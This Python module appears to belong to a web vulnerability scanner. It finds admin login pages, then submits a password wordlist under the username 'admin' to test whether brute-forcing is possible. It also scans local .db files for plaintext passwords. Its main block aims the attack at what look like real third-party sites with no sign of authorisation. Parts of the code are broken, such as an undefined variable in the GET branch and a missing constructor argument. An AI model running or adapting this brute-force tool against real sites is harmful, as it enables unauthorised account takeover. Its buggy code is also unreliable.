from helpers.colors import bcolors
import os
import time
from tqdm import tqdm
from bs4 import BeautifulSoup
import urllib.request
import requests
from loginform import fill_login_form
from databaser.databaser import get_passwords


class Loginer:
    """docstring for Loginer"""

    def __init__(self, configer, folder):
        """TODO: find out if we need to pass whole configer object or just admin pages,
        so it"s maybe will work faster. Or maybe we will make whole admin page finding here separately
        """
        self.url = configer.url
        self.folder = folder
        self.adminpages = configer.adminpages
        self.filtered_pages = []  # not hidden admin pages with forms!
        self.bruteforced = []
        self.passwords = open('assets/passwords.txt').readlines()
        self.users = open('assets/users.txt').readlines()
        self.gap = 100  # max difference between pages to be considered almots the same
        self.captcha = False
        self.hashing = None
        self.db_file = None

    def start_hack(self):

        print(bcolors.OKGREEN +
              "[LOGINER SCAN SEARCH]")

        self.filtered_pages = self.filter_pages(self.adminpages)
        print(bcolors.OKGREEN + "Bruteforce/Vocabulary check:")
        self.bruteforce_attack(self.filtered_pages)

        print(bcolors.OKGREEN + "Searching for database files:")
        self.hashing = self.check_password_hashing()
        print(bcolors.OKGREEN +
              "[LOGINER FINISHED]")


    def get_raw_html(self, url):
        """Return HTML page from url"""
        try:
            res = requests.get(url)
            return res.text
        except:
            return None

    def has_captcha(self, html):
        if "captcha" in html.lower() or "recaptcha" in html.lower():
            return True
        else:
            return False

    def has_login_form(self, html):
        """Return True if html has form with "login" and "password" fields"""
        soup = BeautifulSoup(html, "html.parser")
        form = soup.find("form")
        if form:
            input_fields = form.find_all("input")
            count = 0
            for field in input_fields:
                if field["type"] == "text":
                    # print(field["name"])
                    count += 1
                elif field["type"] == "password":
                    # print(field["name"])
                    count += 1
            if count == 2:
                # we have both login and password fields
                return True
            else:
                return False
        else:
            return False

    def filter_pages(self, page_urls):
        """Create list of pages that has login forms in it"""
        login_pages = []
        for page in page_urls:
            html = self.get_raw_html(page)
            if html:
                if not self.has_captcha(html):
                    if self.has_login_form(html):
                        login_pages.append(page)
                        print(bcolors.FAIL + f"{page} has login form!")
                else:
                    print(bcolors.CYAN + f"{page} has CAPTCHA!, ignoring")
                    self.captcha = True
            else:
                print(bcolors.OKGREEN + f"can't parse HTML from: {page}")
        return login_pages

    def bruteforce_url(self, url, limit):
        """Submit login form for every user/password combination count total attempts.
        Successful attempt is the one which return different html from previous ones.
        """

        attempts = 0
        # for user in self.users:
        # 	user = user.replace('\n', '')
        user = "admin"
        average = 0
        for password in self.passwords:
            password = password.replace('\n', '')
            # Return login, password and other input.names + target url + method
            r = requests.get(url)
            try:
                fillings = fill_login_form(url, r.text, user.replace(
                    '\n', ''), password.replace('\n', ''))
            except:
                print(
                    bcolors.CYAN + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
                return False

            print(bcolors.OKGREEN + f"    trying {user}: {password}")
            payload = dict(fillings[:-2][0])  # parameters for  request
            post_url = fillings[-2:-1][0]
            method = fillings[-1:][0] 		 # POST/GET

            if method == "POST":
                with requests.Session() as s:
                    # get cookie for successful POST request
                    res = requests.get(url)
                    cookies = dict(res.cookies)
                    p = s.post(post_url, data=payload, cookies=cookies)

                    if not average:
                        average = len(p.text)
                    elif len(p.text) - average > self.gap:
                        # we probably have error as page size increased
                        print(
                            bcolors.CYAN + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
                        return False
                attempts += 1

            elif method == "GET":
                with requests.Session() as s:
                    res = requests.get(post_url, params=payload)
                    if not average:
                        average = len(res.text)
                    elif len(p.text) - average > self.gap:
                        # we probably have error as page size increased
                        print(
                            bcolors.CYAN + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
                        return False
                    elif res.status_code != 200:
                        print(
                            bcolors.CYAN + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
                        return False
                attempts += 1

            else:
                # super edge case
                print(bcolors.WARNING +
                      'No method found in form, skipping page' + bcolors.OKGREEN)
                return
        if attempts > limit:
            print(bcolors.FAIL +
                  f"Bruteforce possible! page: {url}" + bcolors.OKGREEN)
            return attempts
        else:
            print(bcolors.CYAN +
                  f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
            return False

    def bruteforce_attack(self, page_urls):
        stats = {}
        for page in page_urls:
            print(bcolors.OKGREEN + page)
            attempts = self.bruteforce_url(page, 10)
            if attempts:
                stats[page] = attempts
        if stats:
            print(bcolors.FAIL + f"Bruteforce possible on pages:")
            for page in stats:
                if stats[page]:
                    print(bcolors.FAIL + page + bcolors.OKGREEN)
                    self.bruteforced.append(page)
        else:
            print(bcolors.CYAN + f"No bruteforce vulnurable pages found!")

    
    def get_db_files(self, folder):
        """Return list of files with *.db extension"""

        db_files = []

        for root, _, filenames in os.walk(folder):
            for filename in tqdm(filenames):
                if filename.endswith(".db"):
                    file_ = os.path.join(root,filename)
                    print(bcolors.OKGREEN + f"{file_} found")
                    db_files.append(file_)
            time.sleep(0.1)
        
        return db_files

    def check_password_hashing(self):
        """
        Return True if found passwords stored as hashes, 
        e.g. all of them same length, has 6
        """

        db_files = self.get_db_files(self.folder)
        if db_files:
            for file_ in db_files:
                result = get_passwords(file_)
                if "error" in result:
                    print(bcolors.WARNING + f"Couldn't read from {file_}")
                else:
                    passwords = result["passwords"]
                    if all(len(i) == len(passwords[0]) for i in passwords):
                        print(bcolors.CYAN + "Password column contains hashes, no plain passwords detected")
                        self.db_file = file_
                        return True
                    else:
                        print(bcolors.FAIL + f"Password column in {file_} contains plain passwords!" + bcolors.OKGREEN)
                        self.db_file = file_
                        return False


if __name__ == "__main__":
    from configer import Configer

    settings = {"local": False,
                "page_limit": None,
                "vocabulary": False,
                }
    c = Configer("http://leafus.com.ua/", settings)
    log = Loginer(c)

    # log.bruteforce_attack(['https://id.bigmir.net/', 'http://leafus.com.ua/wp-admin', 'https://www.ukr.net/'])
    log.start_hack()
